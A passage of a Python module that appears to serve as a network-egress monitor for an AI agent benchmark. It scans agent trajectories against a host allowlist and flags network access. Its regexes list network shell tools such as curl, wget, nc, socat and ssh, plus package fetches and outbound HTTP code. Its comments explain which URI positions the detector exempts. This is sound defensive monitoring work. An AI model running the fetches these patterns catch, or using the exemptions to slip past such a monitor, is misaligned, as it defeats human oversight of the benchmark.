        r"curl|wget|nc|ncat|netcat|socat|telnet|lynx|links|w3m|aria2c"),
        re.I)),
    ("git_remote", re.compile(
        r"\bgit\s+(?:clone|fetch|pull|ls-remote|archive\s+--remote|"
        r"remote\s+(?:add|set-url)|submodule\s+(?:add|update))\b", re.I)),
    ("package_fetch", re.compile(
        r"\b(?:pip3?|python3?\s+-m\s+pip)\s+(?:install|download)\b|"
        r"\bcomposer\s+(?:install|require|update|create-project)\b|"
        r"\bnpm\s+(?:install|i|ci|add)\b|\byarn\s+(?:add|install)\b|"
        r"\bgo\s+get\b|\bgem\s+install\b|\bcargo\s+(?:add|fetch)\b|"
        r"\bapt(?:-get)?\s+install\b", re.I)),
    ("remote_shell", re.compile(_cmd_position(r"ssh|scp|sftp|rsync"), re.I)),
    ("dns_probe", re.compile(_cmd_position(
        r"dig|nslookup|ping|traceroute|getent\s+hosts"), re.I)),
    ("url_in_command", _URL_RE),
)

#: Detectors that take a `user@host:path` target rather than a URL.
_SCP_CATEGORIES = ("git_remote", "remote_shell")

#: Applied to file CONTENT the agent wrote, where the bare-URL detector would
#: fire on every CoreShop licence header (measured: 6 such writes across the C2
#: arm, 0 of them network code).  Only unambiguous client code counts, and it
#: is reported as its own category because writing a fetcher is not yet running
#: one.
_WRITTEN_CODE = re.compile(
    r"urllib\.request|urlopen|requests\.(?:get|post)|httpx\.|aiohttp|"
    r"socket\.create_connection|curl_exec\s*\(|"
    r"\b(?:file_get_contents|fopen)\s*\(\s*[\"']https?://", re.I)

#: Action keys that hold something the agent asked the SHELL to run.
_COMMAND_KEYS = ("command", "code", "script", "cmd")

#: Action keys that hold file content the agent WROTE.  Scanned with
#: `_WRITTEN_CODE` only.
_CONTENT_KEYS = ("file_text", "new_str", "new_content", "content", "insert_line_text")

#: Markers left in output that a quoted file never contains.  Not proof of a
#: transfer in every case: `git_remote`'s `Cloning into` is proof only of an
#: attempt, since git emits it before opening any connection (see the module
#: docstring above for the on-host evidence).  This is the second, independent
#: path to a finding: it catches `python3 fetch.py`, where the command says
#: nothing and only the observation gives it away.
_OBSERVATION_MARKERS = (
    ("git_remote", re.compile(r"Cloning into|Receiving objects:|"
                              r"remote: (?:Enumerating|Counting|Compressing)")),
    ("http_client", re.compile(r"%\s*Total\s+%\s*Received|"
                               r"HTTP request sent, awaiting response|"
                               r"Resolving [\w.\-]+ \(|Connecting to [\w.\-]+\|")),
    ("python_http", re.compile(r"urllib\.error\.\w+|HTTPSConnectionPool|"
                               r"requests\.exceptions\.\w+|"
                               r"\bHTTPError\b|\bURLError\b")),
    ("package_fetch", re.compile(r"- Downloading \S+|Downloading https?://|"
                                 r"Successfully installed \S+")),
)

#: Target bytes or a successful response marker. `Cloning into` is absent:
#: git prints it before connecting, including on the proxy's 403 path.
_AFFIRMATIVE_TRANSFER = re.compile(
    r"Receiving objects:|remote: (?:Enumerating|Counting|Compressing) "
    r"objects|Successfully installed|HTTP/\d(?:\.\d)? 200\b|"
    r"\b[1-9][0-9]* bytes? received\b",
    re.I)


def affirmative_transfer(text: str) -> bool:
    """Whether an observation itself proves remote bytes arrived."""
    return _AFFIRMATIVE_TRANSFER.search(text) is not None


def host_of(url: str) -> Optional[str]:
    """The host a URL names, or None when the command built it at runtime.

    Returning None is a real answer, not a failure: it is what turns a hit into
    a SUSPECT rather than letting an unreadable target quietly become clean.
    """
    match = re.match(r"[A-Za-z][A-Za-z0-9+.\-]*://([^/?#\\]*)", url or "")
    if not match:
        return None
    authority = match.group(1)
    if "@" in authority:
        authority = authority.rsplit("@", 1)[1]
    if authority.startswith("["):
        host = authority[1:authority.index("]")] if "]" in authority \
            else authority[1:]
    else:
        host = authority.split(":")[0]
    host = host.strip().lower()
    if not host or not _HOST_OK.match(host):
        return None
    return host


# -------------------------------------------------------------------- policy

@dataclass
class Policy:
    """Which hosts the agent was allowed to reach.  Allowlist, never denylist.

    A denylist of "the places answers live" is unwritable — the answer to a
    CoreShop item is on GitHub, on Packagist, in a Google cache, in somebody's
    blog post and in a paste bin — so the policy is inverted: the agent needs
    the model endpoint to think, and it needs nothing else, so everything else
    is denied by nature and needs no enumeration.
    """

    #: Hosts the agent may reach.  A subdomain of an allowed host is allowed
    #: (`api.deepseek.com` covers `eu.api.deepseek.com`); a PARENT is not
    #: (`api.deepseek.com` does not cover `deepseek.com`), because the parent
    #: is where a vendor's docs, forum and file uploads live.
    allow: frozenset = frozenset()

    #: Fail the gate on SUSPECT hits too.  Off by default so the gate stays
    #: switched on; the right setting for a release the numbers are published
    #: from.
    strict_suspect: bool = False

    def verdict_for(self, host: Optional[str], category: str) -> str:
        if host is None:
            return SUSPECT
        host = host.lower()
        for allowed in self.allow:
            allowed = allowed.lower()
            if host == allowed or host.endswith("." + allowed):
                return PERMITTED
        if host in _LOOPBACK:
            # Not a violation — an agent talking to its own workspace is not
            # exfiltrating — and not permitted either, because a loopback port
            # is exactly where a forwarding proxy would sit.  SUSPECT is the
            # honest answer: reported, so a human decides.
            return SUSPECT
        return VIOLATION


def _as_policy(policy) -> Policy:
    """Accept a Policy, a set of hostnames, or None (allow nothing)."""
    if isinstance(policy, Policy):
        return policy
    if policy is None:
        return Policy()
    if isinstance(policy, dict):
        return Policy(allow=frozenset(policy.get("allow") or ()),
                      strict_suspect=bool(policy.get("strict_suspect")))
    return Policy(allow=frozenset(policy))


def policy_from_base_url(base_url: Optional[str], extra: Iterable = (),
                         strict_suspect: bool = False) -> Policy:
    """The policy a run's own llm config implies: its endpoint, and nothing.

    Read from `base_url` rather than from a flag default, so that pointing the
    benchmark at a different provider cannot leave the gate allowlisting the
    previous one.
    """
    allow = {h.lower() for h in extra if h}
    host = host_of(base_url or "")
    if host:
        allow.add(host)
    return Policy(allow=frozenset(allow), strict_suspect=strict_suspect)


# ------------------------------------------------------------------ scanning

#: Files the SDK writes beside the events that this module deliberately does
#: NOT parse, and which therefore must not be reported as "unrecognized".
#:
#: `base_state.json` is the conversation's opening state — the agent config,
#: including the SDK's own `openrouter_site_url: https://docs.all-hands.dev/`.
#: Raw-sweeping it would report a violation on every attempt in the archive for
#: a URL no agent ever fetched.  `TASKS.json` is the `task_tracker` tool's
#: state file, and every write to it is also an ActionEvent in the event
#: stream, which the structural pass already reads.
#:
#: The cost of this list is real and worth stating: a URL that appears ONLY in
#: one of these two files is not seen.  Neither file can make a network call —
#: running one is a terminal event — so what is lost is intent, not egress.
_KNOWN_SIDECARS = (
    "base_state.json", "TASKS.json", "r2t-egress-proxy-journal.json")

#: The native manifest's file name.  Duplicated from `agents.scanners` for
#: the same reason `item_key` duplicates the adapter's one line instead of
#: importing a 2,000-line module: this name is the ONLY thing the gate needs
#: before deciding whether the seam applies at all, and the scanners package
#: (which pulls the whole adapter chain behind it) is imported only for
#: attempts that actually carry the file.  If the two ever disagree, the
#: scanners selftest — which drives this module end to end — is where it
#: shows up.
_NATIVE_MANIFEST = "native_manifest.json"

#: How much of an unrecognized file the raw sweep reads.  A trajectory event
#: is tens of kilobytes; two megabytes is a wide margin, and a file bigger than
#: this is recorded as truncated rather than silently half-read.  The row is
#: `unassessable` in either case, so the cap cannot turn a refusal into a pass.
_RAW_SWEEP_MAX_BYTES = 2_000_000


# ------------------------------------------------------- detection rules
#
# The rule TABLES above, enumerated by name.  `EGRESS_GATE_VERSION` alone is
# not a reliable identity for the rule set a verifying tree applies: the
# namespace exemption of 2026-08-03 changed what the detector sees and was
# deliberately not given a gate bump (the `EGRESS_GATE_VERSION` block and
# `VERSIONS.yml` say why), so a rule change can hold the integer.  This digest
# moves on any such change; it is pinned at `VERSIONS.yml`
# `components.egress_gate.detection_rules_digest`, recomputed by
# `versions.selftest`, and enforced by `egress_attestation.replay_attestation`
# before a sealed /3 document is replayed against the live detector.
#
# Membership is explicit so that a table added without being listed is a
# review failure rather than a silent hole.  Deliberately absent:
# `EGRESS_GATE_VERSION` (enforced separately against `gate.version`),
# `_URI_BODY` (its text is already inside `_CLARK_RE` and
# `_EXAMPLE_HYPERLINK_RE`), and the `NOT_PREVENTION`/`PROXY_PREVENTION` report
# prose (bound byte-for-byte through `result.stdout_sha256`).  The functions
# that APPLY these tables -- `Policy.verdict_for`, `_exempt_position`,
# `scan_run` -- are covered by the gate's bump rule, not by this digest.

DETECTION_RULES = (
    # What becomes a hit, and with which category.
    ("_DETECTORS", _DETECTORS),
    ("_URL_RE", _URL_RE),
    ("_SCP_RE", _SCP_RE),
    ("_SCP_CATEGORIES", _SCP_CATEGORIES),
    ("_WRITTEN_CODE", _WRITTEN_CODE),
    ("_OBSERVATION_MARKERS", _OBSERVATION_MARKERS),
    ("_AFFIRMATIVE_TRANSFER", _AFFIRMATIVE_TRANSFER),
    ("_COMMAND_KEYS", _COMMAND_KEYS),
    ("_CONTENT_KEYS", _CONTENT_KEYS),
    # How a host resolves and how a hit is scored.
    ("_HOST_OK", _HOST_OK),
    ("_LOOPBACK", _LOOPBACK),
    ("PERMITTED", PERMITTED),
    ("VIOLATION", VIOLATION),
    ("SUSPECT", SUSPECT),
    ("UNASSESSABLE", UNASSESSABLE),
    # What the detector deliberately does not see.
    ("_CLARK_RE", _CLARK_RE),
    ("NAMESPACE_EXEMPTION_RULES", NAMESPACE_EXEMPTION_RULES),
    ("_EXAMPLE_HYPERLINK_RE", _EXAMPLE_HYPERLINK_RE),
    ("TEST_DATA_LITERAL_RULES", TEST_DATA_LITERAL_RULES),
    # Which bytes are inspected at all.
    ("_KNOWN_SIDECARS", _KNOWN_SIDECARS),
    ("_NATIVE_MANIFEST", _NATIVE_MANIFEST),
    ("_RAW_SWEEP_MAX_BYTES", _RAW_SWEEP_MAX_BYTES),
    # What the recorded evidence text says: these shape every snippet and
    # therefore `result.stdout_sha256`.
    ("_SECRET_PATTERNS", _SECRET_PATTERNS),
    ("_REDACTED", _REDACTED),
    ("_MIN_SECRET_LEN", _MIN_SECRET_LEN),
    ("SNIPPET_MAX", SNIPPET_MAX),
)


def _rule_value(value):
    """A rule table as plain JSON: a compiled pattern is its text and flags."""
    if isinstance(value, re.Pattern):
        return [value.pattern, value.flags]
    if isinstance(value, (list, tuple)):
        return [_rule_value(item) for item in value]
    return value


def detection_rules_digest(rules=DETECTION_RULES) -> str:
    """sha256 of the canonical JSON of `(name, value)` rule pairs."""
    encoded = json.dumps(
        [[name, _rule_value(value)] for name, value in rules],
        sort_keys=True, separators=(",", ":"), ensure_ascii=False)
    return hashlib.sha256(encoded.encode("utf-8")).hexdigest()


DETECTION_RULES_DIGEST = detection_rules_digest()


def _native_contract(system) -> Optional[tuple]:
    """`(schema, qualified)` when `system`'s rows OWE a native manifest, else
    None.

    Resolved through the adapter REGISTRY — never a string literal here — so
    the set of systems whose attempts must carry the second recorder is
    declared exactly where the systems are (`AdapterSpec.native_manifest`).
    An archived openhands row resolves to a spec that declares no contract
    and an unknown or absent system resolves to nothing at all; both take
    the manifest-presence dispatch unchanged, which is what keeps every
    archived scan byte-identical.  Function-local import for the same
    reason `scan_trajectory` imports the scanners late: reading an archived
    run must not construct the agent stack.
    """
    if not system:
        return None
    try:
        from .agents.registry import REGISTRY
    except ImportError:
        # The per-agent contract is agent-owned data.  A fixture owes none
        # in any checkout; an agent arm's rows cannot be assessed by a
        # checkout that does not ship the arm, and are refused by name
        # rather than passed on a contract nobody could look up.
        from .bench.fixtures import FIXTURES
        if system in FIXTURES:
            return None
        raise SystemExit(
            f"REFUSED: the run names agent system {system!r}, whose native "
            f"trajectory contract is agent-owned; this checkout does not "
            f"ship the agent component, so its trajectories cannot be "
            f"assessed here.")
    spec = REGISTRY.get(system)
    if spec is None or not getattr(spec, "native_manifest", None):
        return None
    return spec.native_manifest, spec.qualified


def _event_files(directory: str) -> list:
    """Every persisted event under a trajectory directory, in a stable order.

    Walks rather than globs a fixed depth: the layout is
    `<attempt>/<conversation>/events/event-NNNNN-<uuid>.json`, but a caller may
    hand this function the conversation directory or the events directory
    itself, and a gate that silently found nothing because it was pointed one
    level too deep would be the worst possible failure mode.
    """
    found = []
    if not os.path.isdir(directory):
        return found
    for dirpath, dirnames, names in os.walk(directory):
        dirnames[:] = sorted(dirnames)
        for name in sorted(names):
            if name.startswith("event-") and name.endswith(".json"):
                found.append(os.path.join(dirpath, name))
    return sorted(found)


def _conversation_events(attempt_dir: str, conversation: str) -> int:
    """How many events are still on disk under one RECORDED conversation.

    The name comes off the run row, so it is checked rather than joined
    blindly: `..`, an empty string or anything holding a separator is not a
    conversation directory under this attempt, and resolves to zero.  Reading
    it as zero is the fail-closed answer -- the row then looks like one whose
    evidence is gone, rather than one licensed to count events from somewhere
    else as if they were the ones that were scored.  Every archived row's
    conversations are plain `os.listdir` names, so this costs nothing.
    """
    if (not conversation or conversation in (".", "..")
            or "/" in conversation or os.sep in conversation
            or (os.altsep and os.altsep in conversation)):
        return 0
    return len(_event_files(os.path.join(attempt_dir, conversation)))


def _unrecognized_files(directory: str) -> list:
    """Candidate record files under an attempt that this module cannot read.

    Anything ending `.json` or `.jsonl` that is neither an `event-*.json` nor
    one of `_KNOWN_SIDECARS`.  The point is not tidiness: a different agent
    framework writes its trajectory as one `trajectory.jsonl`, and v1 counted
    such a directory as assessed because a directory was there.  An
    inventory of what we could not read is the only way "assessed" can mean
    anything, and it is what makes the row `unassessable` rather than clean.
    """
    out = []
    if not os.path.isdir(directory):
        return out
    for dirpath, dirnames, names in os.walk(directory):
        dirnames[:] = sorted(dirnames)
        for name in sorted(names):
            if not (name.endswith(".json") or name.endswith(".jsonl")):
                continue
            if name.startswith("event-") and name.endswith(".json"):
                continue
            if name in _KNOWN_SIDECARS:
                continue
            out.append(os.path.relpath(os.path.join(dirpath, name), directory))
    return out


def _recount_events(directory: str) -> int:
    """Count the events again, by the ADAPTER's rule rather than this one's.

    `adapters._trajectory_summary` counts every `*.json` directly under
    `<conversation>/events/`; `_event_files` counts every `event-*.json` at any
    depth.  Two rules over the same bytes, so that the number on the run row
    and the number this module scanned are checked against each other by
    something that is not either of them.  A disagreement means a file is
    sitting in an events directory under a name we do not scan — which is the
    shape of the hole this whole revision is about.

    Like `_event_files`, this accepts the attempt directory, one conversation
    inside it, or the events directory itself: it counts `*.json` directly
    inside every directory NAMED `events`.  On the archive's real layout that
    is exactly the adapter's rule; pointed one level too deep it still answers
    the same number, rather than answering 0 and manufacturing a mismatch.
    """
    if not os.path.isdir(directory):
        return 0
    total = 0
    if os.path.basename(os.path.normpath(directory)) == "events":
        roots = [directory]
    else:
        roots = []
        for dirpath, dirnames, _names in os.walk(directory):
            dirnames[:] = sorted(dirnames)
            if os.path.basename(dirpath) == "events":
                roots.append(dirpath)
    for events in roots:
        try:
            names = os.listdir(events)
        except OSError:
            continue
        total += sum(1 for name in names if name.endswith(".json"))
    return total


def _strings(node, keys: tuple) -> list:
    """String values under the named keys, at any depth of an action dict."""
    out = []
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(value, str) and key in keys:
                out.append(value)
            elif isinstance(value, (dict, list)):
                out.extend(_strings(value, keys))
    elif isinstance(node, list):
        for value in node:
            out.extend(_strings(value, keys))
    return out


def _tool_call_commands(event: dict) -> list:
    """Commands as the MODEL asked for them, from `tool_call.arguments`.

    The SDK records the same command twice: once parsed into `action`, and
    once as the raw JSON string the model emitted.  They agree today, and this
    reads both anyway — deduplicated, so agreement costs nothing.  The one
    that matters is the case where they DISAGREE: an action the SDK failed to
    parse, or a tool whose action shape this module has never seen, would
    otherwise leave the request invisible while the response is still on disk.
    """
    call = event.get("tool_call")
    if not isinstance(call, dict):
        return []
    raw = call.get("arguments")
    if not isinstance(raw, str):
        return []
    try:
        parsed = json.loads(raw)
    except ValueError:
        # Unparseable arguments are still the model's own text; scanning them
        # whole is noisier than scanning one field and strictly safer.
        return [raw]
    return _strings(parsed, _COMMAND_KEYS) if isinstance(
        parsed, (dict, list)) else []


def _observation_text(observation) -> str:
    """Whatever the tool printed, flattened.

    The SDK writes `observation.content` as a list of typed blocks; older
    events and other tools use plain `output`/`stdout`/`text`.  Reading only
    the shape that happens to be in front of you is how a detector passes a
    corpus it never actually read.
    """
    if not isinstance(observation, dict):
        return ""
    parts = []
    content = observation.get("content")
    if isinstance(content, list):
        for block in content:
            if isinstance(block, dict) and isinstance(block.get("text"), str):
                parts.append(block["text"])
            elif isinstance(block, str):
                parts.append(block)
    elif isinstance(content, str):
        parts.append(content)
    for key in ("output", "stdout", "stderr", "text", "command"):
        if isinstance(observation.get(key), str):
            parts.append(observation[key])
    return "\n".join(parts)


def _snippet(text: str, start: int, end: int) -> str:
    """A window of already-redacted text around a match, <= SNIPPET_MAX total.

    The ellipses are inside the budget, not added to it: the report contract
    says 200 characters and a reader who trusts it should not have to discover
    that it meant 206.
    """
    span = max(end - start, 0)
    pad = max((SNIPPET_MAX - span) // 2, 0)
    lo = max(start - pad, 0)
    hi = min(max(end, start) + pad, len(text))
    head = "..." if lo > 0 else ""
    tail = "..." if hi < len(text) else ""
    window = " ".join(text[lo:hi].split())
    budget = SNIPPET_MAX - len(head) - len(tail)
    return head + window[:max(budget, 0)] + tail


def _namespace_spans(text: str) -> list:
    """`[(start, end, position)]` for every URI in a non-fetching position.

    Purely syntactic: the one pattern above, and nothing about which host the
    URI names.  The spans are the URI itself, so they line up with what
    `_URL_RE` finds and a URL match can be tested for containment.

    A LIST of (span, position) rather than a bare list of spans, and one
    pattern written out rather than a table to append to: the position is
    carried because the gate has to PRINT which rule looked away, and the
    second position is not a line of table but a decision the module docstring
    sets a measured bar for.
    """
    return [(match.start("uri"), match.end("uri"), "clark-notation")
            for match in _CLARK_RE.finditer(text)]


def _test_data_literal_spans(text: str) -> list:
    """Reserved example-domain URIs in the non-fetching constructor slot.

    The span is the literal URI, not its quotes, receiver, `.format(...)`, or
    whole call.  `_exempt_position` can therefore suppress only the URL match
    that the syntax justified; another URL elsewhere in the same text stays
    visible.
    """
    return [(match.start("uri"), match.end("uri"),
             "paragraph.add_hyperlink-address")
            for match in _EXAMPLE_HYPERLINK_RE.finditer(text)]


def _exempt_position(match, spans: Iterable) -> Optional[str]:
    """Which non-fetching position this URL match sits WHOLLY inside, if any.

    Containment, not overlap: half a URL inside a namespace declaration is not
    a namespace declaration, and reading it as one is how a narrowing becomes
    a hole.  Today `_URI_BODY` and `_URL_RE` share a tail, so every span lines
    up exactly with a URL match and overlap would give the same answers --
    which is exactly why the invariant needs a test rather than an alignment:
    the selftest asserts a partially-overlapping span exempts NOTHING, so a
    later edit to either pattern's tail cannot quietly turn this into overlap.
    """
    for start, end, position in spans:
        if match.start() >= start and match.end() <= end:
            return position
    return None


def _guarded_exemptions(text: str, spans: Iterable) -> list:
    """Apply the shared kill-switch to already-proven non-fetching spans.

    A position rule is never allowed to launder a command that also names a
    fetch primitive.  The bare-URL detector is the one being narrowed and is
    therefore the sole exception; any other detector restores the old,
    no-exemption reading of the entire text.
    """
    spans = list(spans)
    if not spans:
        return []
    for category, pattern in _DETECTORS:
        if category != "url_in_command" and pattern.search(text):
            return []
    return spans


def _namespace_exemptions(text: str) -> list:
    """Clark-notation spans this text may exempt after the kill-switch.

    This is the whole safety argument, in four lines.  A URI in Clark notation
    is only an identifier when there is nothing in the same text that could
    dereference it: `curl "{http://host/a}b"` really does fetch
    `http://host/ab`, because brace expansion is curl's own globbing syntax.
    So the moment ANY detector other than the bare-URL catch-all matches, this
    returns nothing and the text is read exactly as it was before this rule
    existed, Clark notation included.

    That kill-switch is a backstop and not the argument.  The argument is that
    nothing dereferences `{uri}name`, which is why this position survived
    review and the two that relied ONLY on the kill-switch — `xmlns=` and
    `nsmap={...}`, either of which could sit beside an lxml call the corpus
    does not detect — did not.

    The spans are computed first because they are almost always empty, and an
    empty answer costs one regex scan instead of eight.
    """
    return _guarded_exemptions(text, _namespace_spans(text))


def _test_data_literal_exemptions(text: str) -> list:
    """The reserved hyperlink literals allowed in parsed or raw evidence."""
    return _guarded_exemptions(text, _test_data_literal_spans(text))


def _command_exemptions(text: str) -> list:
    """All non-fetching spans understood in a parsed command string."""
    return _guarded_exemptions(
        text, sorted(_namespace_spans(text) + _test_data_literal_spans(text)))


def _rules_for_position(position: str) -> str:
    if position == "clark-notation":
        return NAMESPACE_EXEMPTION_RULES
    if position == "paragraph.add_hyperlink-address":
        return TEST_DATA_LITERAL_RULES
    raise ValueError(f"unknown egress exemption position: {position!r}")


def _exempted(text: str, spans: Iterable) -> list:
    """`[(host, position, snippet, n)]` for the URIs an exemption suppressed.

    What the gate PRINTS.  Deduplicated by (host, position) with a count, so a
    command naming one non-fetching URI four times is one line and says four.
    """
    found = {}
    for match in _URL_RE.finditer(text):
        position = _exempt_position(match, spans)
        if not position:
            continue
        host = host_of(match.group(0))
        key = (host, position)
        if key in found:
            found[key][3] += 1
        else:
            found[key] = [host, position,
                          _snippet(text, match.start(), match.end()), 1]
    return [tuple(record) for record in found.values()]


def _hosts_in(text: str, category: str, exempt: Iterable = ()) -> list:
    """Distinct hosts a command names, in order of appearance.

    Returns `[(host_or_None, start, end)]` — the offsets are what makes the
    snippet quote the URL rather than the top of a 4 KB heredoc.

    `exempt` is a guarded position rule's answer for this same text, and is
    empty everywhere the caller has not asked for a narrowing.  A URL inside
    one of those spans is not a target this command names, so attributing the
    hit to it would be the false accusation over again with a real hit's
    authority behind it.
    """
    seen = {}
    for match in _URL_RE.finditer(text):
        if exempt and _exempt_position(match, exempt):
            continue
        host = host_of(match.group(0))
        if host not in seen:
            seen[host] = (host, match.start(), match.end())
    if category in _SCP_CATEGORIES:
        for match in _SCP_RE.finditer(text):
            host = match.group(1).lower()
            if _HOST_OK.match(host) and host not in seen:
                seen[host] = (host, match.start(), match.end())
    ordered = sorted(seen.values(), key=lambda item: item[1])
    # A command with a readable host AND a bare `http://` is described by the
    # readable one; keeping the None would add a phantom SUSPECT to every hit.
    if len(ordered) > 1:
        ordered = [item for item in ordered if item[0] is not None] or ordered
    return ordered


def _detect(text: str, exempt: Iterable = ()) -> list:
    """[(category, start, end)] for every detector that fires, first-match order.

    `exempt` defaults to nothing.  Parsed commands ask for every proven
    non-fetching position; the raw sweep asks only for the reserved hyperlink
    literal, whose constructor syntax survives in native chat bytes.  It does
    not ask for Clark notation: raw bytes provide no XML context, and their
    hits are capped at SUSPECT rather than contaminating a row.

    When it IS asked, the narrowing touches one detector: `url_in_command`, the
    bare-URL catch-all, which is the only one that fires on a URI alone.  It
    fires on the first URL that is NOT in an exempt span, and does not fire
    when every URL the text holds is a name.  `exempt` is non-empty only when
    no other detector matched (see `_guarded_exemptions`), so the guard below
    is a restatement rather than a second policy.
    """
    fired = []
    for category, pattern in _DETECTORS:
        match = pattern.search(text)
        if match:
            fired.append((category, match.start(), match.end()))
    if exempt and len(fired) == 1 and fired[0][0] == "url_in_command":
        live = next((match for match in _URL_RE.finditer(text)
                     if not _exempt_position(match, exempt)), None)
        if live is None:
            return []
        fired = [("url_in_command", live.start(), live.end())]
    return fired


def _raw_sweep(directory: str, relatives: Iterable, why: str,
               secrets: Iterable = ()) -> tuple:
    """Run the detector corpus over the RAW BYTES of files we could not parse.

    The second, normalizer-independent pass.  `relatives` are paths under
    `directory` that either failed to parse as an event or are in a format this
    module does not read at all; there is no structure to walk in either case,
    so the text is read whole and handed to the same `_DETECTORS` the parsed
    pass uses.

    Redaction happens BEFORE detection, for the reason the redaction section
    gives: a sweep that scanned first would quote the coordinator's api key
    into the gate's own report.

    Returns `(hits, errors, exempt)`.  Every hit is tagged `kind: "raw"`, which
    is what `classify` reads to cap it at SUSPECT — raw bytes cannot tell a
    command that RAN from a URL in a comment, and this pass exists to explain
    a refusal, not to manufacture a violation.  `exempt` is equally explicit:
    raw native chat is where both live example-domain false positives occur,
    so the proven hyperlink-constructor position is recognized here and
    reported under its own rules id.  Clark notation remains parsed-command
    only; raw bytes provide no XML context for that older narrowing.
    """
    hits, errors, exempt_records = [], [], []
    for relative in relatives:
        path = os.path.join(directory, relative)
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as handle:
                blob = handle.read(_RAW_SWEEP_MAX_BYTES + 1)
        except OSError as exc:
            errors.append({"event": relative,
                           "error": f"raw sweep: {type(exc).__name__}: {exc}"})
            continue
        truncated = len(blob) > _RAW_SWEEP_MAX_BYTES
        if truncated:
            blob = blob[:_RAW_SWEEP_MAX_BYTES]
            errors.append({"event": relative,
                           "error": f"raw sweep read only the first "
                                    f"{_RAW_SWEEP_MAX_BYTES} bytes"})
        text = redact(blob, secrets)
        exempt = _test_data_literal_exemptions(text)
        for host, position, snippet, count in _exempted(text, exempt):
            exempt_records.append({
                "event": relative,
                "conversation": "",
                "tool": why,
                "host": host,
                "position": position,
                "n": count,
                "snippet": snippet,
                "rules": _rules_for_position(position),
            })
        fired = _detect(text, exempt)
        if not fired:
            continue
        category, cat_start, cat_end = fired[0]
        located = _hosts_in(text, category, exempt)
        if located:
            for host, start, end in located:
                hits.append({"event": relative, "conversation": "",
                             "kind": "raw", "tool": why, "host": host,
                             "category": category + "_raw",
                             "snippet": _snippet(text, start, end)})
        else:
            hits.append({"event": relative, "conversation": "",
                         "kind": "raw", "tool": why, "host": None,
                         "category": category + "_raw",
                         "snippet": _snippet(text, cat_start, cat_end)})
    return hits, errors, exempt_records


def scan_trajectory(directory: str, secrets: Iterable = ()) -> dict:
    """Every trace of network retrieval in one trajectory directory.

    Returns the report contract:

        {"n_events", "n_hits", "hosts": [...],
         "hits": [{"event", "tool", "host", "snippet", "category", ...}]}

    plus the bookkeeping a gate needs to prove it looked: which directory,
    whether it was there at all, which conversations, and any event file that
    would not parse.  An unreadable event is recorded rather than skipped —
    "the detector could not read 3 of 63 events" is a finding.

    Three fields carry that further, and they are what a caller must read
    before treating a scan as a clean bill of health:

    * `parsed` — true only when at least one event file was read AND none
      failed.  `n_events > 0` proves NOTHING on its own: it counts files that
      exist, not files this module understood.
    * `unrecognized` — every `*.json`/`*.jsonl` under the attempt that is
      neither an event nor a known sidecar, as relative paths.  A directory
      full of a format we cannot read is the fail-open hole v1 fell into.
    * `recount` — the same events counted again by the adapter's rule, so the
      gate's conservation check has an independent second opinion.

    The unrecognized files and the events that failed to parse are then swept
    for network calls over their raw bytes (`_raw_sweep`), because "we could
    not read it" and "there was nothing in it" must not look the same.

    A fourth field carries every position where this scan deliberately looks
    AWAY:

    * `exempt` — every URI a position rule suppressed, with the host, the
      syntactic position, rules id, snippet and occurrence count.  A detector
      that narrows itself in silence cannot be audited, so the narrowing is
      evidence like everything else here, and `gate` prints it.
    """
    directory = os.path.abspath(directory)
    report = {"dir": directory,
              "present": os.path.isdir(directory),
              "gate_version": EGRESS_GATE_VERSION,
              "n_events": 0,
              "n_parsed": 0,
              "parsed": False,
              "recount": _recount_events(directory),
              "unrecognized": _unrecognized_files(directory),
              "n_actions": 0,
              "conversations": [],
              "hits": [],
              "hosts": [],
              "n_hits": 0,
              "exempt": [],
              "errors": []}
    paths = _event_files(directory)
    report["n_events"] = len(paths)
    conversations = set()

    # Pass 1: read every event once.  Observations are attributed to the action
    # that caused them, and an event file can be written before its parent is
    # visible in sort order, so the linking cannot be done streaming.
    events = []
    unparsed = []
    for path in paths:
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as handle:
                data = json.load(handle)
        except (OSError, ValueError) as exc:
            report["errors"].append({"event": os.path.relpath(path, directory),
                                     "error": f"{type(exc).__name__}: {exc}"})
            unparsed.append(os.path.relpath(path, directory))
            continue
        if not isinstance(data, dict):
            report["errors"].append({"event": os.path.relpath(path, directory),
                                     "error": "event is not an object"})
            unparsed.append(os.path.relpath(path, directory))
            continue
        relative = os.path.relpath(path, directory)
        # `<attempt>/<conversation>/events/<file>` -- the conversation is the
        # first component when the caller gave us the attempt directory, and
        # absent when they gave us something deeper.  Either is fine.
        parts = relative.split(os.sep)
        conversation = parts[0] if len(parts) > 2 else ""
        if conversation:
            conversations.add(conversation)
        events.append((relative, conversation, data))
    report["conversations"] = sorted(conversations)
    report["n_parsed"] = len(events)
    # `parsed` is the honest summary of pass 1: we read something, and nothing
    # defeated us.  Either half alone is a lie a gate would repeat.
    report["parsed"] = bool(events) and not report["errors"]

    # The native-manifest seam (module docstring).  Reached only
    # behind the `isfile` — a manifest-less attempt, which is every archived
    # one, takes not one different instruction through this function — and
    # the scanners package is imported here rather than at module scope
    # because it pulls the adapter chain behind it, which the gate has no
    # business loading to read an OpenHands archive.  The declared files are
    # exempted from `unrecognized` BEFORE the raw sweep below, so they are
    # swept once by the seam (as accounted native bytes) rather than once
    # more as unknowns; an INVALID manifest exempts nothing, and the row then
    # fails closed through both the unrecognized path and its own reasons.
    native = None
    if os.path.isfile(os.path.join(directory, _NATIVE_MANIFEST)):
        from .agents import scanners as _scanners
        native = _scanners.verify(directory,
                                  [data for _rel, _conv, data in events],
                                  secrets, _raw_sweep)
    if native is not None:
        declared = set(native.get("declared") or ())
        if declared:
            report["unrecognized"] = [name for name in report["unrecognized"]
                                      if name not in declared]
        report["native"] = {"agent_system": native.get("agent_system"),
                            "counts": native.get("counts"),
                            "declared": sorted(declared),
                            # `None` unless the manifest declared that the
                            # attempt was cut short.  Surfaced rather than
                            # consumed silently: a CLEAN row whose evidence
                            # stops mid-turn is a different fact from a clean
                            # row that ran to completion, and a campaign that
                            # cannot count the first has no idea how much of
                            # its evidence is partial.
                            "termination": native.get("termination"),
                            "problems": list(native.get("problems") or ())}

    # Pass 2: the agent's own commands.  These are the findings; everything
    # else in this function is corroboration.
    hits = []
    exempt_seen = {}           # (host, position) -> the one record for it

    def remember_exempt(record: dict) -> None:
        """Deduplicate disclosures across normalized and native evidence."""
        key = (record.get("host"), record.get("position"))
        previous = exempt_seen.get(key)
        if previous is not None:
            previous["n"] += record.get("n") or 0
            return
        kept = dict(record)
        exempt_seen[key] = kept
